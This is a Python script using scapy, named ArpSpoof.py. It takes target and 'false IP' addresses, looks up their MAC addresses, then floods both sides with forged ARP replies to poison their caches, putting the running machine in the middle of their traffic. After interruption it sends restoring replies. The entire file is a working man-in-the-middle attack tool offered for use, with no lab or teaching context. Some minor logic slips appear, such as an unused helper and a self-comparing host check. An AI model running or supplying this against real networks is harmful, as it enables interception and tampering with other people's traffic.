from scapy.all import *
import sys
import time

def getOptions():
	options=dict()
	key=None
	for each in sys.argv[1:]:
		if key==None:
			key=each
		else:
			options[key]=each
			key=None
	return options

def printHelp():
	print("ArpSpoof.py <-t Target|-T TargetsFile> <-f FalseIP|-F FalseIPsFile> [-i iface]\r\n\n",end="")
	print("\t-t\tA target you will spoof.\r\n",end="")
	print("\t-T\tA file of targets.\r\n",end="")
	print("\t-f\tA false IP.\r\n",end="")
	print("\t-F\tA file of false IPs.\r\n",end="")

def getTargets(options):
	if "-T" not in options:
		if "-t" not in options:
			return None
		else:
			return [options["-t"]]
	else:
		targets=[]
		with open(options["-T"],"r") as f:
			for each in f:
				targets.append(each[:len(each)-1])
		return targets

def getFalseIps(options):
	if "-F" not in options:
		if "-f" not in options:
			return None
		else:
			return [options["-f"]]
	else:
		falseIps=[]
		with open(options["-F"],"r") as f:
			for each in f:
				falseIps.append(each[:len(each)-1])
		return falseIps

def getTargetsMac(targets):
	pkt=Ether(src=get_if_hwaddr(iface),dst="ff:ff:ff:ff:ff:ff")/\
	ARP(psrc=get_if_addr(iface),hwsrc=get_if_hwaddr(iface),pdst=targets,hwdst="ff:ff:ff:ff:ff:ff",op=1)
	res=srp(pkt,iface=iface,timeout=5)
	targets_mac=dict()
	for each in res[0]:
		targets_mac[each[1][ARP].psrc]=each[1][ARP].hwsrc
	return targets_mac

def getFalseIpsMac(falseIps):
	pkt=Ether(src=get_if_hwaddr(iface),dst="ff:ff:ff:ff:ff:ff")/\
	ARP(psrc=get_if_addr(iface),hwsrc=get_if_hwaddr(iface),pdst=falseIps,hwdst="ff:ff:ff:ff:ff:ff",op=1)
	res=srp(pkt,iface,timeout=5)
	falseIps_mac=dict()
	for each in res[0]:
		falseIps_mac[each[1][ARP].psrc]=each[1][ARP].hwsrc
	return falseIps_mac

def arpSpoof(targets_mac,falseIps_mac):
	pktlist=[]
	for target in targets_mac:
		for falseIp in falseIps_mac:
			pktlist.append(Ether(src=get_if_hwaddr(iface),dst=targets_mac[target])/ARP(psrc=falseIp,hwsrc=get_if_hwaddr(iface),pdst=target,hwdst=targets_mac[target],op=2))
			pktlist.append(Ether(src=get_if_hwaddr(iface),dst=falseIps_mac[falseIp])/ARP(psrc=target,hwsrc=get_if_hwaddr(iface),pdst=falseIp,hwdst=falseIps_mac[falseIp],op=2))
	print("[*] Start Arp spoofing.\r\n",end="")
	try:
		sendp(pktlist,loop=1)
	except KeyboardInterrupt:
		pass
	print("[*] Arp spoof finiched.\r\n",end="")

def restore(targets_mac,falseIps_mac):
	pktlist=[]
	for target in targets_mac:
		for falseIp in falseIps_mac:
			pktlist.append(Ether(src=falseIps_mac[falseIp],dst=targets_mac[target])/ARP(psrc=falseIp,hwsrc=falseIps_mac[falseIp],pdst=target,hwdst=targets_mac[target],op=2))
			pktlist.append(Ether(src=targets_mac[target],dst=falseIps_mac[falseIp])/ARP(psrc=target,hwsrc=targets_mac[target],pdst=falseIp,hwdst=falseIps_mac[falseIp],op=2))
	sendp(pktlist)

conf.verb=0
options=getOptions()
targets=getTargets(options)
falseIps=getFalseIps(options)
if targets==None:
	print("[!] Arg Error.You must fill in the \"-t\" or \"-T\" argument.\r\n",end="")
if falseIps==None:
	print("[!] Arg Error.You must fill in the \"-f\" or \"-F\" argument.\r\n",end="")
if targets==None or falseIps==None:
	printHelp()
	exit()
iface=options["-i"] if "-i" in options else conf.iface
print("[*] Finished to read argument.\r\n",end="")
targets_mac=getTargetsMac(targets)
print("[*] Finished to get targets mac address.\r\n",end="")
falseIps_mac=getTargetsMac(falseIps)
print("[*] Finished to get false IPs mac address.\r\n",end="")
for each in targets:
	if each not in targets_mac:
		print("[!] Host Error.Can\'t find the host %s.\r\n"%(each),end="")
for each in falseIps_mac:
	if each not in falseIps_mac:
		print("[!] Host Error.Can\'t find the host %s.\r\n"%(each),end="")
arpSpoof(targets_mac,falseIps_mac)
restore(targets_mac,falseIps_mac)
